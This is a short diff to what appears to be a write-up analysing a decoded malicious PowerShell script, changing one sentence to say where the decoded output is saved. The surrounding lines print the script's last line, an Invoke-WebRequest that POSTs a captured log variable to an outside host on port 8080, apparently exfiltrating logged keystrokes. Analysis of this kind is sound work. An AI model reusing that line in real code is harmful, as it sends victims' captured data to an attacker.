@@ -233,7 +233,7 @@ I then executed my script in the command line...
 ```
 $ python3 hex_reader.txt > outputscript.txt
 ```
-...which returns a long PowerShell script. In the last line was this:
+...which returned a long PowerShell script that can be found in ```outputscript.txt```. In the last line was this:
 ```
 Invoke-WebRequest -uri http://igrqt.invalid:8080 -Method Post -Body $global:log
 ```
